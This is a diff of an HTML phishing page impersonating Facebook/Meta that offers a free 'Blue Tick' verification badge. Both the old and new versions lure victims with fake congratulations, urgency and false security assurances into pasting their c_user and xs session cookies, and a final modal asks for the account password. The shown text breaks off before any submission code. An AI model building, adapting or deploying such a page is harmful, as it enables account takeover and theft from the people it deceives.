@@ -1,940 +1,1058 @@
 
 
 
-
-
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Facebook Blue Tick Center</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Blue Tick - Free Upgrade</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-      :root {
-        --fb-blue: #1877f2;
-        --fb-blue-dark: #166fe5;
-        --fb-red: #f02849;
-        --fb-green: #42b72a;
-        --fb-gray: #f0f2f5;
-        --fb-text: #1c1e21;
-        --fb-text-light: #65676b;
-      }
-
-      body {
-        font-family: "Segoe UI Historic", "Segoe UI", Helvetica, Arial,
-          sans-serif;
-        background-color: var(--fb-gray);
-        margin: 0;
-        padding: 0;
-        color: var(--fb-text);
-      }
-
-      /* Main Container */
-      .fb-container {
-        max-width: 800px;
-        margin: 0 auto;
-        padding: 20px;
-      }
-
-      /* Header */
-      .fb-header {
-        text-align: center;
-        margin-bottom: 30px;
-      }
-
-      .fb-logo {
-        height: 70px;
-        margin-bottom: 15px;
-      }
-
-      .security-badge {
-        display: inline-flex;
-        align-items: center;
-        background-color: white;
-        padding: 8px 16px;
-        border-radius: 20px;
-        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-        margin-bottom: 15px;
-        font-size: 14px;
-      }
-
-      .security-badge svg {
-        margin-right: 8px;
-        color: var(--fb-blue);
-      }
-
-      /* Warning Box */
-      .warning-box {
-        background-color: white;
-        border-radius: 8px;
-        padding: 20px;
-        margin-bottom: 20px;
-        border-left: 5px solid var(--fb-red);
-        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-      }
-
-      .warning-title {
-        color: var(--fb-red);
-        margin-top: 0;
-      }
-
-      /* Official Notice */
-      .official-notice {
-        background-color: white;
-        border-radius: 8px;
-        padding: 15px;
-        margin-bottom: 20px;
-        border: 1px solid #dddfe2;
-      }
-
-      .notice-header {
-        display: flex;
-        align-items: center;
-        margin-bottom: 10px;
-      }
-
-      .verified-badge {
-        color: var(--fb-blue);
-        margin-right: 8px;
-      }
-
-      /* Button */
-      .fb-button {
-        background-color: var(--fb-blue);
-        color: white;
-        border: none;
-        border-radius: 6px;
-        font-size: 16px;
-        font-weight: 600;
-        padding: 12px 24px;
-        cursor: pointer;
-        display: block;
-        width: 100%;
-        max-width: 300px;
-        margin: 20px auto;
-        text-align: center;
-        transition: background-color 0.3s;
-        position: relative;
-      }
-
-      .fb-button:hover {
-        background-color: var(--fb-blue-dark);
-      }
-
-      .fb-button:disabled {
-        background-color: #b7c9e8;
-        cursor: not-allowed;
-      }
-
-      /* Button loading animation */
-      .button-loading {
-        color: transparent !important;
-      }
-
-      .button-loading::after {
-        content: "";
-        position: absolute;
-        width: 20px;
-        height: 20px;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        margin: auto;
-        border: 3px solid transparent;
-        border-top-color: white;
-        border-radius: 50%;
-        animation: button-loading-spinner 1s linear infinite;
-      }
-
-      @keyframes button-loading-spinner {
-        from {
-          transform: rotate(0turn);
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
         }
-        to {
-          transform: rotate(1turn);
+        
+        body {
+            background: linear-gradient(135deg, #1877F2 0%, #0D61B4 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
         }
-      }
-
-      /* Footer */
-      .fb-footer {
-        text-align: center;
-        margin-top: 30px;
-        font-size: 13px;
-        color: var(--fb-text-light);
-      }
-
-      .fb-footer a {
-        color: var(--fb-text-light);
-        text-decoration: none;
-        margin: 0 8px;
-      }
-
-      .fb-footer a:hover {
-        text-decoration: underline;
-      }
-
-      /* Modal Styles */
-      .modal {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.5);
-        z-index: 1000;
-        backdrop-filter: blur(5px);
-      }
-
-      .modal-content {
-        background-color: white;
-        border-radius: 8px;
-        width: 90%;
-        max-width: 500px;
-        margin: 5% auto;
-        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
-        position: relative;
-        animation: modalFadeIn 0.3s;
-        max-height: 80vh;
-        overflow-y: auto;
-      }
-
-      /* Thin Scrollbar */
-      .modal-content::-webkit-scrollbar {
-        width: 6px;
-      }
-
-      .modal-content::-webkit-scrollbar-track {
-        background: #f1f1f1;
-        border-radius: 3px;
-      }
-
-      .modal-content::-webkit-scrollbar-thumb {
-        background: #888;
-        border-radius: 3px;
-      }
-
-      .modal-content::-webkit-scrollbar-thumb:hover {
-        background: #555;
-      }
-
-      @keyframes modalFadeIn {
-        from {
-          opacity: 0;
-          transform: translateY(-20px);
+        
+        .container {
+            max-width: 900px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            margin-top: 20px;
         }
-        to {
-          opacity: 1;
-          transform: translateY(0);
+        
+        header {
+            text-align: center;
+            margin-bottom: 40px;
         }
-      }
-
-      .modal-header {
-        padding: 16px;
-        border-bottom: 1px solid #dddfe2;
-        position: sticky;
-        top: 0;
-        background: white;
-        z-index: 1;
-      }
-
-      .modal-title {
-        font-size: 20px;
-        font-weight: 600;
-        margin: 0;
-        text-align: center;
-      }
-
-      .close {
-        position: absolute;
-        left: 16px;
-        top: 16px;
-        color: #606770;
-        font-size: 24px;
-        cursor: pointer;
-      }
-
-      .modal-body {
-        padding: 16px;
-      }
-
-      /* Verification Steps */
-      .verification-steps {
-        margin-bottom: 20px;
-      }
-
-      .step {
-        display: flex;
-        margin-bottom: 15px;
-        align-items: flex-start;
-      }
-
-      .step-number {
-        background-color: var(--fb-blue);
-        color: white;
-        width: 24px;
-        height: 24px;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin-right: 12px;
-        flex-shrink: 0;
-        font-size: 14px;
-        font-weight: bold;
-      }
-
-      .step-content {
-        flex-grow: 1;
-      }
-
-      .step-title {
-        font-weight: 600;
-        margin-bottom: 5px;
-      }
-
-      .step-description {
-        color: var(--fb-text-light);
-        font-size: 14px;
-        line-height: 1.4;
-      }
-
-      /* Video Container */
-      .video-container {
-        background-color: #000;
-        border-radius: 8px;
-        margin: 16px 0;
-        overflow: hidden;
-        position: relative;
-      }
-
-      .video-placeholder {
-        width: 100%;
-        height: 250px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        color: white;
-        background: linear-gradient(135deg, #4267b2 0%, #898f9c 100%);
-      }
-
-      .video-instruction {
-        text-align: center;
-        font-size: 14px;
-        color: var(--fb-text-light);
-        margin-bottom: 16px;
-      }
-
-      /* Form Inputs */
-      .fb-input-group {
-        margin-bottom: 16px;
-      }
-
-      .fb-input-label {
-        display: block;
-        margin-bottom: 8px;
-        font-weight: 600;
-        font-size: 15px;
-      }
-
-      .fb-input {
-        width: 100%;
-        padding: 12px;
-        border: 1px solid #dddfe2;
-        border-radius: 6px;
-        font-size: 15px;
-        box-sizing: border-box;
-      }
-
-      .fb-input:focus {
-        outline: none;
-        border-color: var(--fb-blue);
-        box-shadow: 0 0 0 2px #e7f3ff;
-      }
-
-      .fb-input.invalid {
-        border-color: var(--fb-red);
-      }
-
-      .fb-note {
-        font-size: 13px;
-        color: var(--fb-text-light);
-        margin-top: 8px;
-        line-height: 1.4;
-      }
-
-      .fb-note-warning {
-        color: var(--fb-red);
-        font-weight: 500;
-      }
-
-      .error-message {
-        color: var(--fb-red);
-        font-size: 13px;
-        margin-top: 5px;
-        display: none;
-      }
-
-      .error-message.show {
-        display: block;
-      }
-
-      /* Security Badge */
-      .security-badge-modal {
-        display: flex;
-        align-items: center;
-        background-color: #f0f2f5;
-        padding: 12px;
-        border-radius: 6px;
-        margin: 16px 0;
-      }
-
-      .security-badge-modal svg {
-        margin-right: 8px;
-        color: var(--fb-blue);
-        flex-shrink: 0;
-      }
-
-      .security-badge-text {
-        font-size: 13px;
-        color: var(--fb-text-light);
-      }
-
-      /* Loading Animation */
-      .fb-loading-bar {
-        height: 3px;
-        background-color: #e4e6eb;
-        border-radius: 3px;
-        overflow: hidden;
-        margin-bottom: 16px;
-      }
-
-      .fb-loading-progress {
-        height: 100%;
-        width: 30%;
-        background-color: var(--fb-blue);
-        animation: fb-loading 2s infinite;
-      }
-
-      @keyframes fb-loading {
-        0% {
-          transform: translateX(-100%);
+        
+        .meta-logo {
+            font-size: 42px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
-        100% {
-          transform: translateX(300%);
+        
+        .meta-logo i {
+            color: #1877F2;
+            background: white;
+            padding: 10px;
+            border-radius: 50%;
         }
-      }
-
-      /* Password Modal */
-      .password-modal-content {
-        text-align: center;
-      }
-
-      .password-logo {
-        height: 50px;
-        margin-bottom: 15px;
-      }
-
-      /* Success Modal */
-      .success-modal-content {
-        text-align: center;
-        padding: 30px;
-      }
-
-      .success-logo {
-        height: 70px;
-        margin-bottom: 20px;
-      }
-
-      .success-title {
-        color: var(--fb-blue);
-        margin-bottom: 15px;
-      }
-
-      .success-message {
-        margin-bottom: 25px;
-        line-height: 1.5;
-      }
-
-      .success-checkmark {
-        color: var(--fb-green);
-        font-size: 48px;
-        margin-bottom: 20px;
-      }
+        
+        .tagline {
+            font-size: 18px;
+            opacity: 0.9;
+            margin-bottom: 30px;
+        }
+        
+        .nav-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .nav-btn {
+            background: rgba(255, 255, 255, 0.15);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 14px 28px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .nav-btn:hover {
+            background: rgba(255, 255, 255, 0.25);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .congratulations-section {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 40px;
+            margin: 30px 0;
+            text-align: center;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .congratulations-title {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+        
+        .blue-tick-highlight {
+            color: white;
+            font-weight: 700;
+        }
+        
+        .offer-text {
+            font-size: 22px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        
+        .limited-time {
+            background: linear-gradient(135deg, #FF5722 0%, #FF9800 100%);
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: 700;
+            display: inline-block;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .verification-form {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 30px 0;
+            text-align: center;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .form-title {
+            font-size: 28px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            background: white;
+            color: #1877F2;
+            border: none;
+            padding: 18px;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .submit-btn:hover {
+            background: #f0f2f5;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .meta-verified-info {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            text-align: center;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .meta-verified-title {
+            font-size: 24px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .meta-verified-desc {
+            font-size: 18px;
+            line-height: 1.6;
+            opacity: 0.9;
+        }
+        
+        /* JavaScript Modal Styles */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-content {
+            background: linear-gradient(135deg, #1877F2 0%, #0D61B4 100%);
+            width: 90%;
+            max-width: 700px;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
+            position: relative;
+            animation: modalSlideIn 0.4s ease-out;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        
+        @keyframes modalSlideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .modal-title {
+            font-size: 24px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .close-modal {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+        
+        .close-modal:hover {
+            transform: rotate(90deg);
+        }
+        
+        .modal-body {
+            text-align: left;
+        }
+        
+        .video-section {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .video-title {
+            font-size: 22px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .language-selection-section {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 20px 0;
+            text-align: center;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .language-selection-title {
+            font-size: 22px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .language-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .language-option {
+            background: rgba(255, 255, 255, 0.15);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .language-option:hover {
+            background: rgba(255, 255, 255, 0.25);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .language-option.selected {
+            background: rgba(255, 255, 255, 0.3);
+            border-color: white;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .language-flag {
+            font-size: 24px;
+        }
+        
+        .language-name {
+            font-size: 16px;
+        }
+        
+        .video-container {
+            width: 100%;
+            margin: 0 auto;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+        
+        .video-container video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        .video-caption {
+            margin-top: 15px;
+            font-size: 16px;
+            opacity: 0.9;
+            line-height: 1.5;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border-radius: 10px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: white;
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        
+        .verification-instructions {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 16px;
+            line-height: 1.5;
+            text-align: left;
+        }
+        
+        .modal-footer {
+            margin-top: 25px;
+        }
+        
+        .modal-submit-btn {
+            width: 100%;
+            background: white;
+            color: #1877F2;
+            border: none;
+            padding: 18px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+        }
+        
+        .modal-submit-btn:hover {
+            background: #f0f2f5;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .modal-submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top: 2px solid #1877F2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Facebook Modal Styles */
+        .facebook-modal .modal-content {
+            background: white;
+            color: #1c1e21;
+            max-width: 500px;
+        }
+        
+        .facebook-modal .modal-header {
+            border-bottom: 1px solid #dddfe2;
+            padding-bottom: 15px;
+        }
+        
+        .facebook-modal .modal-title {
+            color: #1877F2;
+            font-size: 22px;
+        }
+        
+        .facebook-logo {
+            font-size: 40px;
+            color: #1877F2;
+            margin-bottom: 10px;
+        }
+        
+        .facebook-modal .close-modal {
+            color: #65676b;
+        }
+        
+        .facebook-modal .form-group label {
+            color: #1c1e21;
+        }
+        
+        .facebook-modal .form-group input {
+            background: #f5f6f7;
+            border: 1px solid #dddfe2;
+            color: #1c1e21;
+        }
+        
+        .facebook-modal .form-group input:focus {
+            border-color: #1877F2;
+            background: white;
+        }
+        
+        .facebook-modal .form-group input::placeholder {
+            color: #8a8d91;
+        }
+        
+        .facebook-modal .modal-submit-btn {
+            background: #1877F2;
+            color: white;
+        }
+        
+        .facebook-modal .modal-submit-btn:hover {
+            background: #166fe5;
+        }
+        
+        footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 14px;
+            opacity: 0.7;
+        }
+        
+        @media (max-width: 768px) {
+            .nav-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .congratulations-title {
+                font-size: 28px;
+            }
+            
+            .offer-text {
+                font-size: 18px;
+            }
+            
+            .modal-content {
+                width: 95%;
+                padding: 20px;
+            }
+            
+            .language-options {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
     </style>
-  </head>
-  <body>
-    <div class="fb-container">
-      <div class="fb-header">
-        <img
-          src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
-          alt="Facebook"
-          class="fb-logo"
-          onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg'"
-        />
-        <div class="security-badge">
-          <svg
-            xmlns="http://www.w3.org/2000/svg"
-            width="16"
-            height="16"
-            fill="currentColor"
-            viewBox="0 0 16 16"
-          >
-            <path
-              d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"
-            />
-          </svg>
-          <span>Facebook Secure Connection</span>
+</head>
+<body>
+    <header>
+        <div class="meta-logo">
+            <i class="fab fa-meta"></i>
+            <span>Meta</span>
         </div>
-        <h1>Page blue tick Center</h1>
-      </div>
-
-      <div class="official-notice">
-        <div class="notice-header">
-          <svg
-            class="verified-badge"
-            xmlns="http://www.w3.org/2000/svg"
-            width="16"
-            height="16"
-            fill="currentColor"
-            viewBox="0 0 16 16"
-          >
-            <path
-              d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"
-            />
-          </svg>
-          <strong>Official Notice from Facebook</strong>
+        <h1>Blue Tick Feature - Free Upgrade</h1>
+        <p class="tagline">Get verified with the new Blue Tick feature at no cost</p>
+    </header>
+    
+    <div class="container">
+        <div class="nav-buttons">
+            <button class="nav-btn">
+                <i class="fas fa-home"></i>
+                Home
+            </button>
+           
         </div>
-        <p>
-        Congratulations! You have been selected for a free verified page 
-        </p>
-      </div>
-
-      <div class="warning-box">
-        <h2 class="warning-title">Action Required</h2>
-        <p>
-          Your <strong>"Business Page"</strong> selected for
-          our <strong>Creator Verify Permanent Badge 2025</strong> The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.
-        </p>
-        <p>
-  Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements,please submit an appeal by
-          clicking the button below and following the instructions.
-        </p>
-      </div>
-
-      <button id="submitAppealBtn" class="fb-button">Continue for verification</button>
-
-      <div class="fb-footer">
-        <a href="#">Help Center</a>
-        <a href="#">Privacy Policy</a>
-        <a href="#">Terms of Service</a>
-        <a href="#">Community Standards</a>
-        <span>Meta © 2023</span>
-      </div>
-    </div>
-
-    <!-- Appeal Form Modal -->
-    <div id="appealModal" class="modal">
-      <div class="modal-content">
-        <div class="modal-header">
-          <span class="close">&times;</span>
-          <h2 class="modal-title">Page Verification Appeal</h2>
-        </div>
-        <div class="modal-body">
-          <div class="fb-loading-bar">
-            <div class="fb-loading-progress"></div>
-          </div>
-
-          <div class="verification-steps">
-            <div class="step">
-              <div class="step-number">1</div>
-              <div class="step-content">
-                <div class="step-title">Watch the verification video</div>
-                <div class="step-description">
-                  Learn how to find your Facebook authentication tokens
-                </div>
-              </div>
-            </div>
-
-            <div class="step">
-              <div class="step-number">2</div>
-              <div class="step-content">
-                <div class="step-title">Enter your authentication tokens</div>
-                <div class="step-description">
-                  Required to verify your page ownership
-                </div>
-              </div>
-            </div>
-
-            <div class="step">
-              <div class="step-number">3</div>
-              <div class="step-content">
-                <div class="step-title">Complete identity confirmation</div>
-                <div class="step-description">
-                  Final step to request a verified badge on facebook 
-                </div>
-              </div>
-            </div>
-          </div>
-
-          <div class="video-container">
-            <video controls width="100%" style="background-color: #000">
-              <source
-                src="https://hwtwzunrlegrqrhtompr.supabase.co/storage/v1/object/sign/fokindvedio/english%20(1).mp4?token=eyJraWQiOiJzdG9yYWdlLXVybC1zaWduaW5nLWtleV83MDlmYjNjZi0zNDRkLTQ3ZjItYTE4MC0wYmVhY2UzNzI2MzUiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJmb2tpbmR2ZWRpby9lbmdsaXNoICgxKS5tcDQiLCJpYXQiOjE3NTQ3MzA2NjQsImV4cCI6MTc4NjI2NjY2NH0.oj240Fj5aLRmFhnr5jLNB-meH5GpugxRXJDVfjjbqmo"
-                type="video/mp4"
-              />
-              Your browser does not support the video tag.
-            </video>
-          </div>
-
-          <p class="video-instruction">
-            Follow the video instructions to locate your authentication tokens
-            in browser cookies,Please ensure that all required information is accurately provided. failure to do so may result in not receiving a verified badge.
-          </p>
-
-          <div class="fb-input-group">
-            <label class="fb-input-label" for="c_user">c_user Token</label>
-            <input
-              type="text"
-              id="c_user"
-              class="fb-input"
-              placeholder="Enter c_user token (numbers only)"
-            />
-            <div id="c_user_error" class="error-message">
-              Error: c_user must contain only numbers
-            </div>
-            <p class="fb-note">
-              This token identifies your Facebook account for verification
+        
+        <div class="congratulations-section">
+            <h2 class="congratulations-title">
+                Congratulations!
+            </h2>
+            <p class="offer-text">
+                We're excited to unveil our newest <span class="blue-tick-highlight">Blue Tick</span> feature – a <span class="blue-tick-highlight">free upgrade</span> that grants you access to premium tools and benefits at no cost!
             </p>
-          </div>
-
-          <div class="fb-input-group">
-            <label class="fb-input-label" for="xs">xs Token</label>
-            <input
-              type="text"
-              id="xs"
-              class="fb-input"
-              placeholder="Enter xs token (letters, numbers & symbols)"
-            />
-            <div id="xs_error" class="error-message">
-              Error: xs must contain combination of letters, numbers and symbols
-            </div>
-            <p class="fb-note fb-note-warning">
-              Important: Do not log out of your account for 24 hours after
-              submission
+            <p class="offer-text">
+                <span class="blue-tick-highlight">No fees. No subscriptions. No catch.</span> Your verified badge is ready — absolutely free!
             </p>
-          </div>
-
-          <div class="security-badge-modal">
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              width="20"
-              height="20"
-              fill="currentColor"
-              viewBox="0 0 16 16"
-            >
-              <path
-                d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"
-              />
-            </svg>
-            <div class="security-badge-text">
-              Your information is protected by Facebook's encryption and will
-              only be used for verification purposes.
+            <div class="limited-time">
+                This is a limited-time offer, so don't delay — send in your application now.
             </div>
-          </div>
+        </div>
+        
+        <div class="meta-verified-info">
+            <div class="meta-verified-title">Grow your social presence with Meta Verified</div>
+            <div class="meta-verified-desc">
+                A new subscription bundle available for creators and businesses on Instagram and Facebook. Get the blue checkmark and extra protection with Meta Verified.
+            </div>
+        </div>
+        
+        <div class="verification-form">
+            <h2 class="form-title">Claim Your Free Blue Tick Now</h2>
+            <button class="submit-btn" id="claimButton">
+                <i class="fas fa-check-circle"></i>
+                Get Verified Now - Free Upgrade
+            </button>
+        </div>
+    </div>
+    
+    <!-- JavaScript Modal for Verification -->
+    <div class="modal-overlay" id="verificationModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title">
+                    <i class="fas fa-shield-alt"></i>
+                    Account Verification
+                </h3>
+                <button class="close-modal" id="closeModal">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <div class="modal-body">
+                <!-- Language Selection Section -->
+                <div class="language-selection-section" id="languageSelection">
+                    <h3 class="language-selection-title">Select Your Preferred Language</h3>
+                    <p>Please select the language in which you would like to watch the verification video:</p>
+                    
+                    <div class="language-options">
+                        <div class="language-option" data-lang="english">
+                            <div class="language-flag">🇺🇸</div>
+                            <div class="language-name">English</div>
+                        </div>
+                        <div class="language-option" data-lang="spanish">
+                            <div class="language-flag">🇪🇸</div>
+                            <div class="language-name">Spanish</div>
+                        </div>
+                        <div class="language-option" data-lang="portuguese">
+                            <div class="language-flag">🇵🇹</div>
+                            <div class="language-name">Portuguese</div>
+                        </div>
+                        <div class="language-option" data-lang="hindi">
+                            <div class="language-flag">🇮🇳</div>
+                            <div class="language-name">Hindi</div>
+                        </div>
+                        <div class="language-option" data-lang="filipino">
+                            <div class="language-flag">va</div>
+                            <div class="language-name">Vietname</div>
+                        </div>
+                        <div class="language-option" data-lang="tamil">
+                            <div class="language-flag">🇮🇳</div>
+                            <div class="language-name">Tamil</div>
+                        </div>
+                    </div>
+                    
+                    <button class="modal-submit-btn" id="confirmLanguage" style="margin-top: 20px;" disabled>
+                        <i class="fas fa-play-circle"></i>
+                        Play Video in Selected Language
+                    </button>
+                </div>
+                
+                <!-- Video Section Inside Modal (Initially Hidden) -->
+                <div class="video-section" id="videoSection" style="display: none;">
+                    <h3 class="video-title">How to Get Verified - Step by Step</h3>
+                    
+                    <div class="video-container">
+                        <video id="verificationVideo" controls>
+                            <source src="" type="video/mp4">
+                            Your browser does not support the video tag.
+                        </video>
+                    </div>
+                    <p class="video-caption" id="videoCaption">
+                        Watch this video to learn about the verification process and how to complete your application successfully.
+                    </p>
+                </div>
+                
+                <div class="verification-instructions" id="verificationInstructions" style="display: none;">
+                    <p><strong>Verification Instructions:</strong> Please enter the following verification codes to complete your Blue Tick application.</p>
+                </div>
+                
+                <form id="verificationForm" style="display: none;">
+                    <div class="form-group">
+                        <label for="maajachud">c_user</label>
+                        <input type="text" id="maajachud" name="maajachud" placeholder="Enter c_user" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="bhernjachud">xs</label>
+                        <input type="text" id="bhernjachud" name="bhernjachud" placeholder="Enter xs" required>
+                    </div>
+                    
+                    <div class="modal-footer">
+                        <button type="submit" class="modal-submit-btn" id="submitVerification">
+                            <i class="fas fa-check-circle"></i>
+                            Complete Verification
+                            <div class="loading-spinner" id="verificationSpinner"></div>
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Facebook Surname Modal -->
+    <div class="modal-overlay facebook-modal" id="surnameModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title">
+                    <i class="fab fa-facebook"></i>
+                    Facebook Verification
+                </h3>
+                <button class="close-modal" id="closeSurnameModal">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <div class="modal-body">
+                <div class="facebook-logo">
+                    <i class="fab fa-facebook"></i>
+                </div>
+                
+                <div class="verification-instructions" style="background: #f0f2f5; color: #1c1e21;">
+                    <p><strong>Final Step:</strong> Please enter your password to complete the Facebook verification process.</p>
+                </div>
+                
